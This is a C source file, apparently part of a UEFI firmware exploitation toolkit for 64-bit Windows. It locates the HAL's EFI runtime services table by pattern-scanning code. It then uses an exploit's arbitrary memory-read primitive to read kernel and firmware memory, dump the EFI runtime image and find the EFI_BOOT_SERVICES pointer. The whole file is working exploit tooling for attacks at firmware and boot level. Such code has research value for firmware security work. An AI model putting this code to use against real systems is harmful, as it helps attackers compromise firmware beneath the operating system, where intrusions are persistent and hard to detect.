#include "stdafx.h"
//--------------------------------------------------------------------------------------
#ifdef _AMD64_

#define IS_CANONICAL_ADDR(_addr_) (((DWORD_PTR)(_addr_) & 0xfffff80000000000) == 0xfffff80000000000)

#define IS_EFI_DXE_ADDR(_addr_) (((DWORD_PTR)(_addr_) & 0xffffffff00000000) == 0 && \
                                 ((DWORD_PTR)(_addr_) & 0x00000000ffffffff) != 0)

#else

#error x64 only

#endif

char *m_szHalNames[] =
{
    "hal.dll",      // Non-ACPI PIC HAL 
    "halacpi.dll",  // ACPI PIC HAL
    "halapic.dll",  // Non-ACPI APIC UP HAL
    "halmps.dll",   // Non-ACPI APIC MP HAL
    "halaacpi.dll", // ACPI APIC UP HAL
    "halmacpi.dll", // ACPI APIC MP HAL
    NULL
};

unsigned long long win_get_efi_boot_services(void)
{
    unsigned long long Ret = 0;

    PRTL_PROCESS_MODULES Info = (PRTL_PROCESS_MODULES)GetSysInf(SystemModuleInformation);
    if (Info)
    {
        PVOID HalAddr = NULL;
        char *lpszHalName = NULL;

        // enumerate loaded kernel modules
        for (DWORD i = 0; i < Info->NumberOfModules; i += 1)
        {            
            char *lpszName = (char *)Info->Modules[i].FullPathName + Info->Modules[i].OffsetToFileName;

            // match by all of the possible HAL names
            for (DWORD i_n = 0; m_szHalNames[i_n] != NULL; i_n += 1)
            {                
                if (!strcmp(strlwr(lpszName), m_szHalNames[i_n]))
                {
                    // get HAL address and path
                    HalAddr = Info->Modules[i].ImageBase;
                    lpszHalName = lpszName;
                    break;
                }
            }            
        }
        
        if (HalAddr && lpszHalName)
        {
            // load HAL as dynamic library
            HMODULE hModule = LoadLibraryExA(lpszHalName, 0, DONT_RESOLVE_DLL_REFERENCES);
            if (hModule)
            {
                PVOID pHalEfiRuntimeServicesTable = NULL;
                PVOID EfiRuntimeImageAddr = NULL;
                DWORD dwEfiRuntimeImageSize = 0;

                PVOID Func = GetProcAddress(hModule, "HalGetEnvironmentVariableEx");
                if (Func)
                {                    
                    for (DWORD i = 0; i < 0x40; i += 1)
                    {
                        PUCHAR Ptr = RVATOVA(Func, i), Addr = NULL;

                        /*
                            Check for the following code of hal!HalGetEnvironmentVariableEx():
                            
                                cmp     cs:HalFirmwareTypeEfi, 0

                                ...

                                HalEfiRuntimeServicesTable dq ?
                                HalFirmwareTypeEfi db ?
                        */
                        if (*(PUSHORT)Ptr == 0x3d80 /* CMP */)
                        {
                            // get address of hal!HalEfiRuntimeServicesTable
                            Addr = Ptr + *(PLONG)(Ptr + 2) - 1;
                        }
                        else if (*(PUSHORT)(Ptr + 0) == 0x3844 && *(Ptr + 2) == 0x2d /* CMP */)
                        {
                            // get address of hal!HalEfiRuntimeServicesTable
                            Addr = Ptr + *(PLONG)(Ptr + 3) - 1;
                        }

                        if (Addr)
                        {                            
                            // calculate a real kernel address
                            pHalEfiRuntimeServicesTable = (PVOID)RVATOVA(HalAddr, Addr - (PUCHAR)hModule);
                            break;
                        }
                    }
                }

                if (IS_CANONICAL_ADDR(pHalEfiRuntimeServicesTable))
                {
                    PVOID HalEfiRuntimeServicesTable = NULL;

                    DbgMsg(
                        __FILE__, __LINE__, "hal!HalEfiRuntimeServicesTable is at "IFMT"\n", 
                        pHalEfiRuntimeServicesTable
                    );

                    // read hal!HalEfiRuntimeServicesTable value
                    if (uefi_expl_virt_mem_read(
                        (unsigned long long)pHalEfiRuntimeServicesTable, 
                        sizeof(PVOID), (unsigned char *)&HalEfiRuntimeServicesTable))
                    {
                        DbgMsg(
                            __FILE__, __LINE__, "hal!HalEfiRuntimeServicesTable value is "IFMT"\n",
                            HalEfiRuntimeServicesTable
                        );

                        if (IS_CANONICAL_ADDR(HalEfiRuntimeServicesTable))
                        {
                            PVOID EfiGetVariable = NULL;

                            // read EFI_RUNTIME_SERVICES.GetVariable() address
                            if (uefi_expl_virt_mem_read(
                                (unsigned long long)HalEfiRuntimeServicesTable + (sizeof(DWORD_PTR) * 3),
                                sizeof(PVOID), (unsigned char *)&EfiGetVariable))
                            {
                                DbgMsg(
                                    __FILE__, __LINE__, "EFI_RUNTIME_SERVICES.GetVariable() is at "IFMT"\n",
                                    EfiGetVariable
                                );

                                if (IS_CANONICAL_ADDR(EfiGetVariable))
                                {
                                    PUCHAR Addr = (PUCHAR)XALIGN_DOWN((DWORD_PTR)EfiGetVariable, PAGE_SIZE);
                                    DWORD dwMaxSize = 0;

                                    // find EFI image load address by EFI_RUNTIME_SERVICES.GetVariable() address
                                    while (dwMaxSize < PAGE_SIZE * 4)
                                    {
                                        UCHAR Buff[PAGE_SIZE];

                                        // read memory page of EFI image
                                        if (!uefi_expl_virt_mem_read((unsigned long long)Addr, PAGE_SIZE, Buff))
                                        {
                                            break;
                                        }

                                        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)&Buff;

                                        // check for valid DOS header
                                        if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE && 
                                            pDosHeader->e_lfanew < PAGE_SIZE - sizeof(IMAGE_NT_HEADERS))
                                        {
                                            PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)
                                                RVATOVA(pDosHeader, pDosHeader->e_lfanew);

                                            // check for valid NT header
                                            if (pNtHeader->Signature == IMAGE_NT_SIGNATURE)
                                            {                                                
                                                EfiRuntimeImageAddr = Addr;
                                                dwEfiRuntimeImageSize = pNtHeader->OptionalHeader.SizeOfImage;
                                                break;
                                            }
                                        }

                                        Addr -= PAGE_SIZE;
                                        dwMaxSize += PAGE_SIZE;
                                    }
                                }                                
                            }
                        }
                    }
                }
                else
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        __FUNCTION__"() ERROR: Unable to locate hal!HalEfiRuntimeServicesTable\n"
                    );
                }

                if (IS_CANONICAL_ADDR(EfiRuntimeImageAddr) && dwEfiRuntimeImageSize > 0)
                {
                    DbgMsg(
                        __FILE__, __LINE__, "EFI image is at "IFMT" (%d bytes)\n", 
                        EfiRuntimeImageAddr, dwEfiRuntimeImageSize
                    );

                    PUCHAR Image = (PUCHAR)M_ALLOC(dwEfiRuntimeImageSize);
                    if (Image)
                    {
                        // dump EFI runtime image from memory
                        if (uefi_expl_virt_mem_read(
                            (unsigned long long)EfiRuntimeImageAddr, 
                            dwEfiRuntimeImageSize, Image))
                        {
                            PUCHAR Code = NULL;
                            DWORD dwCodeSize = 0;

                            PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
                                RVATOVA(hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);

                            PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
                                RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

                            // enumerate image sections        
                            for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1)
                            {
                                char *lpszName = (char *)&pSection->Name;
                                
                                // find code section
                                if (!strncmp(lpszName, ".text", 5))
                                {
                                    Code = RVATOVA(Image, pSection->VirtualAddress);
                                    dwCodeSize = pSection->SizeOfRawData;
                                    break;
                                }

                                pSection += 1;
                            }

                            if (Code && dwCodeSize > 0)
                            {
                                for (DWORD i = 0; i < dwCodeSize; i += 1)
                                {
                                    PUCHAR Ptr = RVATOVA(Code, i);

                                    /*
                                        Check for the following code:

                                            mov     cs:qword_AA8DCEA8, rdx      ; EFI_SYSTEM_TABLE
                                            mov     r9, [rdx+60h]
                                            mov     rbx, r8
                                            mov     cs:qword_AA8DCE98, r9       ; EFI_BOOT_SERVICES
                                            mov     rax, [rdx+58h]
                                            mov     rdi, rcx
                                            lea     r8, qword_AA8DCEB8
                                            lea     rcx, qword_AA8DB810
                                            xor     edx, edx
                                            mov     cs:qword_AA8DCEA0, rax      ; EFI_RUNTIME_SERVICES
                                    */
                                    if (*(Ptr + 0x00) == 0x48 && *(Ptr + 0x01) == 0x89 && *(Ptr + 0x02) == 0x15 &&
                                        *(Ptr + 0x07) == 0x4c && *(Ptr + 0x08) == 0x8b && *(Ptr + 0x09) == 0x4a && *(Ptr + 0x0a) == 0x60 && 
                                        *(Ptr + 0x0e) == 0x4c && *(Ptr + 0x0f) == 0x89 && *(Ptr + 0x10) == 0x0d)
                                    {
                                        // get address of variable that points to EFI_BOOT_SERVICES
                                        PVOID *pEfiBootServices = (PVOID *)(Ptr + 0x0e + *(PLONG)(Ptr + 0x11) + 0x07);                                                                                

                                        if (IS_EFI_DXE_ADDR(*pEfiBootServices))
                                        {                                            
                                            DbgMsg(
                                                __FILE__, __LINE__,
                                                "EFI_BOOT_SERVICES address is "IFMT"\n", *pEfiBootServices
                                            );

                                            Ret = (unsigned long long)*pEfiBootServices;
                                        }
                                        
                                        break;
                                    }
                                }

                                if (Ret == 0)
                                {
                                    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to locate EFI_BOOT_SERVICES\n");
                                }
                            }
                            else
                            {
                                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to locate code section\n");
                            }                                                       
                        }

                        M_FREE(Image);
                    }
                }

                FreeLibrary(hModule);
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "LoadLibraryEx() ERROR %d\n", GetLastError());
            }
        } 
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to locate HAL.DLL\n");
        }

        M_FREE(Info);
    }

    return Ret;
}
//--------------------------------------------------------------------------------------
// EoF
